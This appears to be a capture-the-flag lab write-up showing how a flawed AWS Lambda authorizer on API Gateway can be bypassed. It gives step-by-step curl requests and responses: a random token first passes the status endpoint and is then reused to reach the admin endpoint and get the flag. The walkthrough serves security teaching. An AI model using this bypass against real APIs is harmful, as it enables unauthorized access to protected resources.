Lambda authorizersÂ is an API Gateway feature that uses a Lambda function to control access to the API. Based on the information provided in the request, i.e tokens, request parameters, etc, the lambda function returns a policy that allows or denies access to the API.

In this lab, we will take a look at how to poorly built lambda authorizer can be leveraged to access the API.  

Objective: Bypass the authorization and retrieve the flag

====================================================================

Send GET request to admin endpoint.
`curl -X GET https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/admin`
Result --> {"message": "Unauthorized"}
Authorization fails due to missing token.
Send GET request to status endpoint.
`curl -X GET https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/status`
Result --> {"message": "Unauthorized"}

Send a GET request to status endpoint with authorization header.
`curl -X GET -H "Authorization: anyvalue" https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/status`
Result --> {"msg": "ok"}
Authorization successful.

Send a GET request to admin endpoint with different authorization header.
`curl -X GET -H "Authorization: anyvalue1" https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/admin`
Result --> {"message": "User is not authorized to access this resource with an explicit deny"}
Status endpoint can be accessed with new token but admin endopoint can't be.

Create a new random token bash variable.
`TOKEN=$RANDOM`
`echo $TOKEN` --> 4266
Send GET request to status endpoint with token variable.
`curl -X GET -H "Authorization: $TOKEN" https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/status`
Result --> {"msg": "ok"}

Send GET request to admin endpoint with same variable.
`curl -X GET -H "Authorization: $TOKEN" https://slyh63f06e.execute-api.us-east-1.amazonaws.com/dev/admin`
Result --> {"msg": "Flag: xxxxxxxx"}
Authorization bypassed.
